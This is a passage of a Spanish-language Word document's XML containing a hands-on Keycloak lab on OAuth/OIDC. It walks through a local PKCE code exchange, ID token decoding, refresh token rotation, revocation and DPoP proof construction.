        <w:t>CHALLENGE=$(python -c "import hashlib,base64,sys; v=sys.argv[1].encode(); print(base64.urlsafe_b64encode(hashlib.sha256(v).digest()).rstrip(b'=').decode())" "$VERIFIER")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "verifier=$VERIFIER"; echo "challenge=$CHALLENGE"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrí en el navegador (reemplazá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>CHALLENGE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>):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http://localhost:8080/realms/lab/protocol/openid-connect/auth</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  ?response_type=code</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;client_id=lab-web</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;redirect_uri=http://localhost:8989/callback</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;scope=openid profile email</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;state=abc123</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;nonce=n-0S6_WzA2Mj</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;code_challenge=CHALLENGE</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;code_challenge_method=S256</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Iniciá sesión con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>tester</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. El navegador intentará ir a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>http://localhost:8989/callback?code=XXXX&amp;state=abc123</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (fallará la carga, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>es esperado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Copiá el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de la barra de direcciones.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CODE="pegar-el-code"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>VERIFIER="pegar-el-verifier"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=authorization_code -d client_id=lab-web \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d code_verifier="$VERIFIER" | tee tokens.json | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> JSON con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>access_token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id_token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refresh_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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el código se cambia por tokens por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>canal trasero</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, protegido por PKCE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 15 — Decodificar el ID token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IDT=$(jq -r .id_token tokens.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python - "$IDT" &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import sys, json, base64</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>p = sys.argv[1].split('.')[1]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>p += '=' * (-len(p) % 4)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2, ensure_ascii=False))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>iss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aud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exp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sub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auth_time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amr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nonce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sid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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el ID token dice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>quién</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cómo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se autenticó; va a la app, y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se usa para acceder a recursos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 16 — Probar que PKCE es obligatorio</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Repetí el intercambio </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin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1F3B66"/>
        </w:rPr>
        <w:t>code_verifier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (con un code nuevo):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curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=authorization_code -d client_id=lab-web \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> error </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>invalid_grant</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("code_verifier missing"). Con Keycloak y PKCE obligatorio, el código robado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no sirve sin el verifier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 17 — Refresh token y rotación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RT=$(jq -r .refresh_token tokens.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Canje 1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" &gt; t2.json</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>RT2=$(jq -r .refresh_token t2.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "RT viejo: ${RT:0:20}..."; echo "RT nuevo: ${RT2:0:20}..."</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Reusar el VIEJO (debe fallar si hay rotación/revoke)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el refresh cambia y el viejo devuelve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>invalid_grant</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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rotación + detección de reuso (lo que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9700</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> exige para clientes públicos).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 18 — Revocación / logout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## Revocar el refresh</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/revoke \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d client_id=lab-web -d token="$RT2" -d token_type_hint=refresh_token -o /dev/null -w "%{http_code}\n"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Verificar que ya no sirve</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT2" | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> revocación </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>200</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; luego </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>invalid_grant</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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existe un endpoint de revocación (</w:t>
      </w:r>
      <w:hyperlink r:id="rId39">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7009</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>) y el logout debe invalidar artefactos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte D — DPoP (sender-constrained)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 19 — Construir una prueba DPoP (conceptual, local)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pip install cryptography</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cat &gt; dpop_proof.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## DPoP: el CLIENTE firma una "prueba" con su clave privada. RFC 9449.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import json, base64, time, secrets</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from cryptography.hazmat.primitives.asymmetric import ec</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from cryptography.hazmat.primitives import hashes</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def b64u_json(o): return b64u(json.dumps(o, separators=(',',':')).encode())</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>key = ec.generate_private_key(ec.SECP256R1())</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>header = {"typ": "dpop+jwt", "alg": "ES256",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">          "jwk": {"kty":"EC","crv":"P-256",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                  "x": b64u(key.public_key().public_numbers().x.to_bytes(32,'big')),</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                  "y": b64u(key.public_key().public_numbers().y.to_bytes(32,'big'))}}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>claims = {"jti": secrets.token_urlsafe(16), "htm": "GET", "htu": "http://localhost:5000/safe",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">          "iat": int(time.time())}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>signing_input = (b64u_json(header) + "." + b64u_json(claims)).encode()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>der = key.sign(signing_input, ec.ECDSA(hashes.SHA256()))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>r, s = decode_dss_signature(der)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sig = b64u(r.to_bytes(32,'big') + s.to_bytes(32,'big'))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(signing_input.decode() + "." + sig)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python dpop_proof.py</w:t>
      </w:r>
    </w:p>
    <w:p/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la prueba ata el token al método (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), a la URL (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
